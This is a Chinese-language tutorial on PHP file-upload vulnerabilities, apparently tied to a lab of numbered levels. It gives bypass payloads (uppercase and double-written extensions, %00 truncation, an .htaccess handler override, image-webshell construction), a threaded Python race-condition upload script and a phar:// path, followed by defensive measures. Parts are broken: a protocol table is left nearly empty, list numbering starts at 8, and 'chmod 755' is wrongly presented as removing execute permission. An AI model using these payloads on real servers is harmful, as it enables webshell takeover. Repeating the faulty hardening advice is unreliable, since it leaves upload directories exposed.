## 漏洞原理与危害

### 核心原理
- **文件上传机制**：通过`multipart/form-data`表单提交文件，使用`move_uploaded_file`函数保存文件  
- **危险函数**：`eval()`、`system()`等函数执行用户输入  

### 典型危害
| **危害类型**       | **具体表现**                                                                 |
|--------------------|----------------------------------------------------------------------------|
| WebShell控制       | 通过一句话木马获取服务器权限                                                 |
| 黑链植入           | 在网页中插入恶意跳转代码                                                      |
| 数据泄露           | 窃取数据库凭证、敏感文件                                                      |
| 挖矿与DDoS         | 植入加密货币挖矿程序或发起网络攻击                                             |

## 文件上传绕过技术

### 基础绕过方法
| **关卡** | **防御机制**         | **绕过方法**                                                                 |
|----------|---------------------|-----------------------------------------------------------------------------|
| P1       | 前端JS校验           | 禁用浏览器JS或删除校验代码                                                   |
| P2       | MIME类型校验         | Burp修改`Content-Type: image/jpeg`                                          |
| P6       | 大小写过滤           | 上传`shell.PHP`                                                             |
| P7       | 空格截断             | 文件名后加空格`shell.php `                                                  |
| P11      | 双写绕过             | 上传`shell.pphphp`                                                          |

### 高级绕过技术
| **技术**          | **原理**                                                                 | **示例**                                                                 |
|-------------------|-------------------------------------------------------------------------|-------------------------------------------------------------------------|
| .htaccess劫持     | 通过自定义解析规则执行图片马                                             | ```<FilesMatch "*.jpg"> SetHandler application/x-httpd-php </FilesMatch>``` |
| %00截断           | 利用空字符截断路径检测                                                   | `shell.php%00.jpg`                                                     |
| 图片马制作         | 将WebShell插入图片元数据                                                 | `copy image.jpg/b + shell.php/a merged.jpg` (Windows)                   |
| 二次渲染绕过       | 制作能存活于图像处理后的WebShell                                         | 使用GIF89a头+PHP代码                                                    |

## 高级攻击技术

### 条件竞争攻击
```python
# competition18.py 示例
import requests
import threading

def upload():
    while True:
        files = {'file': open('shell.php', 'rb')}
        requests.post('http://target/upload.php', files=files)

for _ in range(20):
    threading.Thread(target=upload).start()
```

| **协议**      | **利用场景**                                                             |
|---------------|-------------------------------------------------------------------------|

| `phar://`     | 通过压缩包执行代码：`phar://upload/shell.zip/shell.php`                  |

## 漏洞防御方案

### 代码层防护
```php
// 白名单校验示例
$allowed_ext = ['jpg', 'png'];
$file_ext = strtolower(pathinfo($_FILES['file']['name'], PATHINFO_EXTENSION));
if (!in_array($file_ext, $allowed_ext)) {
    die("文件类型禁止上传！");
}
```

### 服务器配置
8. **文件权限控制**：Web目录禁止执行权限  
   ```bash
   chmod -R 755 /var/www/uploads/
   ```
9. **PHP安全配置**：  
   ```ini
   file_uploads = Off
   expose_php = Off
   ```

### 综合策略
| **防御策略**       | **具体措施**                                                                 |
|--------------------|-----------------------------------------------------------------------------|
| 文件重命名          | 上传文件哈希命名（如`md5(filename) + timestamp`）                           |
| 内容安全检查        | 使用ClamAV等工具扫描恶意内容                                                 |
| WAF规则            | 拦截包含`eval(`、`system(`等危险关键词的请求                                  |
